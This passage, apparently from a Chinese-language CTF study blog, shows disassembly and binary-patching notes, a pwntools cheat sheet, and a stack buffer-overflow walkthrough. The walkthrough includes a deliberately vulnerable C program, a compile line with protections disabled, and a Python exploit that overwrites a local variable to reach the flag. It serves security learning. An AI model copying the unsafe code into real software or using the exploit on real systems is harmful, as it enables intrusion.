+0x0000000000400bba &lt;+194&gt;:	mov    eax,DWORD PTR [rax*4+0x602300]
+0x0000000000400bc1 &lt;+201&gt;:	xor    eax,edx
+0x0000000000400bc3 &lt;+203&gt;:	movsx  eax,al
+0x0000000000400bc6 &lt;+206&gt;:	mov    esi,eax
+0x0000000000400bc8 &lt;+208&gt;:	mov    edi,0x6021c0
+0x0000000000400bcd &lt;+213&gt;:	call   0x4008b0 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_c@plt&gt;
+0x0000000000400bd2 &lt;+218&gt;:	add    DWORD PTR [rbp-0x98],0x1
+0x0000000000400bd9 &lt;+225&gt;:	mov    eax,DWORD PTR [rbp-0x98]
+0x0000000000400bdf &lt;+231&gt;:	movsxd rdx,eax
+0x0000000000400be2 &lt;+234&gt;:	mov    eax,0x22
+0x0000000000400be7 &lt;+239&gt;:	cmp    rdx,rax
+0x0000000000400bea &lt;+242&gt;:	jb     0x400ba1 &lt;main+169&gt;
+0x0000000000400bec &lt;+244&gt;:	mov    eax,0x1
+0x0000000000400bf1 &lt;+249&gt;:	jmp    0x400c65 &lt;main+365&gt;
+0x0000000000400bf3 &lt;+251&gt;:	mov    eax,DWORD PTR [rbp-0xa0]
+0x0000000000400bf9 &lt;+257&gt;:	cmp    eax,DWORD PTR [rbp-0x94]
+0x0000000000400bff &lt;+263&gt;:	jge    0x400c08 &lt;main+272&gt;
+0x0000000000400c01 &lt;+265&gt;:	mov    eax,0x400d68
+0x0000000000400c06 &lt;+270&gt;:	jmp    0x400c0d &lt;main+277&gt;
+0x0000000000400c08 &lt;+272&gt;:	mov    eax,0x400d6b
+0x0000000000400c0d &lt;+277&gt;:	mov    rsi,rax
+0x0000000000400c10 &lt;+280&gt;:	mov    edi,0x6021c0
+0x0000000000400c15 &lt;+285&gt;:	call   0x4008d0 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
+0x0000000000400c1a &lt;+290&gt;:	mov    esi,0x400910
+0x0000000000400c1f &lt;+295&gt;:	mov    rdi,rax
+0x0000000000400c22 &lt;+298&gt;:	call   0x400900 &lt;_ZNSolsEPFRSoS_E@plt&gt;
+0x0000000000400c27 &lt;+303&gt;:	mov    eax,DWORD PTR [rbp-0x9c]
+0x0000000000400c2d &lt;+309&gt;:	lea    edx,[rax+0x1]
+0x0000000000400c30 &lt;+312&gt;:	mov    DWORD PTR [rbp-0x9c],edx
+0x0000000000400c36 &lt;+318&gt;:	cmp    eax,0x16
+0x0000000000400c39 &lt;+321&gt;:	setle  al
+0x0000000000400c3c &lt;+324&gt;:	test   al,al
+0x0000000000400c3e &lt;+326&gt;:	jne    0x400b64 &lt;main+108&gt;
+0x0000000000400c44 &lt;+332&gt;:	mov    esi,0x400d6e
+0x0000000000400c49 &lt;+337&gt;:	mov    edi,0x6021c0
+0x0000000000400c4e &lt;+342&gt;:	call   0x4008d0 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
+0x0000000000400c53 &lt;+347&gt;:	mov    esi,0x400910
+0x0000000000400c58 &lt;+352&gt;:	mov    rdi,rax
+0x0000000000400c5b &lt;+355&gt;:	call   0x400900 &lt;_ZNSolsEPFRSoS_E@plt&gt;
+0x0000000000400c60 &lt;+360&gt;:	mov    eax,0x0
+0x0000000000400c65 &lt;+365&gt;:	leave  
+0x0000000000400c66 &lt;+366&gt;:	ret
+</code></pre>
+<ul>
+<li>將<br>{&#x3D;&gt; 0x75} 為nop指令 {&#x3D;&gt; 0x90}<img src="https://hackmd.io/_uploads/Hkgv-Id5T.png" alt="image"></li>
+</ul>
+<hr>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><ul>
+<li>擷取提示<img src="https://hackmd.io/_uploads/SkT8aI_9T.png" alt="image"></li>
+</ul>
+<h3 id="pwntools-常用技術-出處"><a href="#pwntools-常用技術-出處" class="headerlink" title="pwntools 常用技術 &#x3D;&#x3D;&gt;出處"></a>pwntools 常用技術 &#x3D;&#x3D;&gt;<a target="_blank" rel="noopener" href="https://github.com/MyFirstSecurity2020/ProgSec/blob/main/4-5.md">出處</a></h3><ul>
+<li>載入pwntools套件 &#x3D;&#x3D;&gt; from pwn import * # 可將所有子模組和一些常用的系統函數庫導入</li>
+<li>建立與程式連結(connection)<ul>
+<li>與遠端程式(使用remote())<ul>
+<li>conn &#x3D; remote(‘ip_address’, port_num)</li>
+<li>conn &#x3D; remote(‘173.4.5.1’, 8888)</li>
+</ul>
+</li>
+<li>與本地端程式(使用process())&#x3D;&#x3D;&gt; conn &#x3D; process(‘.&#x2F;pwn1’)</li>
+</ul>
+</li>
+<li>接收資料 receive<ul>
+<li>recv(numb&#x3D;1096, timeoutxtdefault)：接收指定位元組數的資料</li>
+<li>recvall()：接收資料直到 EOF</li>
+<li>recvline(keepends&#x3D;True)：接收一行，可選擇是否保留行尾的 \n</li>
+<li>recvlines(N):接收 N行輸出</li>
+<li>recvrepeat(timeoutxtdefault)：接收資料直到 EOF(END of FILE) 或 timeout</li>
+<li>recvuntil(delims, timeoutxtdefault)：接收資料直到 delims 出現</li>
+</ul>
+</li>
+<li>傳資料<ul>
+<li>send(data)：發送資料</li>
+<li>sendline(data)：發送一行，預設會在行尾加 \n</li>
+<li>sendlineafter(delims, 要送出的資料)：從 delims 出現後,將要送出的資料 傳送給程式</li>
+</ul>
+</li>
+<li>互動 &#x3D;&#x3D;&gt; conn.interactive()<ul>
+<li>可同時對遠端系統讀寫資料</li>
+<li>相當於回到 shell 模式進行互動</li>
+<li>在取得 shell 之後調用</li>
+</ul>
+</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/110990925">pwntools工具的使用</a></li>
+</ul>
+<h3 id="範例-DATA202401-pwn"><a href="#範例-DATA202401-pwn" class="headerlink" title="範例 &#x2F;DATA202401&#x2F;pwn"></a>範例 &#x2F;DATA202401&#x2F;pwn</h3><ul>
+<li>c</li>
+</ul>
+<pre><code class="c++">//pass.c
+#include&quot;stdio.h&quot;
+#include&quot;stdlib.h&quot;
+int main()&#123;
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+  int token = 1234;
+  char key[16];
+  printf(&quot;Billy left his key in the locked room.\n&quot;);
+  printf(&quot;However, he forgot the token of the room.\n&quot;);
+  printf(&quot;Do you know what&#39;s the key?&quot;);
+  read(0, key, 40);
+  if((int)token == 0xdeadbeef)&#123;
+    printf(&quot;Door open. OwO\n&quot;);
+    system(&quot;cat ./flag&quot;);
+  &#125;else&#123;
+    printf(&quot;Cannot open door. QwQ\n&quot;);
+  &#125;
+  return 0;
+&#125;
+</code></pre>
+<ul>
+<li>輸入指令<ul>
+<li><code>gedit pass.c</code></li>
+<li><code>gcc -fno-stack-protector -z execstack pass.c -o pass -no-pie</code></li>
+<li><code>socat TCP-LISTEN:21004,fork EXEC:&#39;./pass&#39;</code></li>
+</ul>
+</li>
+</ul>
+<pre><code class="python=">#pass.py
+from pwn import *
+r = process(&#39;./pass&#39;)
+r = remote(&#39;localhost&#39;,21004)
+payload = b&#39;B&#39;*28
+r.sendline(payload+ p64(0xdeadbeef))
+r.interactive()
+</code></pre>
+<ul>
+<li><p>py<img src="https://hackmd.io/_uploads/r1R8dvOca.png" alt="image"></p>
+</li>
+<li><p>flag<img src="https://hackmd.io/_uploads/HkxG9Duc6.png" alt="image"></p>
+</li>
+<li><p>用gdb看一下 &#x3D;&#x3D;disabled!&#x3D;&#x3D;<img src="https://hackmd.io/_uploads/rJhAcwucT.png" alt="image"></p>
+</li>
+<li><p>用radare2去看main<img src="https://hackmd.io/_uploads/S19Ujwucp.png" alt="image"></p>
+<ul>
+<li>知道下面的是哪邊是false就可以去用地址了<img src="https://hackmd.io/_uploads/HyzTjvu5p.png" alt="image"><ul>
+<li>其中的變數<img src="https://hackmd.io/_uploads/SyrXnDO9T.png" alt="image"></li>
+<li>相互compare<img src="https://hackmd.io/_uploads/SyRrnD_5a.png" alt="image"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2023 - 2024 此情吳計可消除
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;yih-0118
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
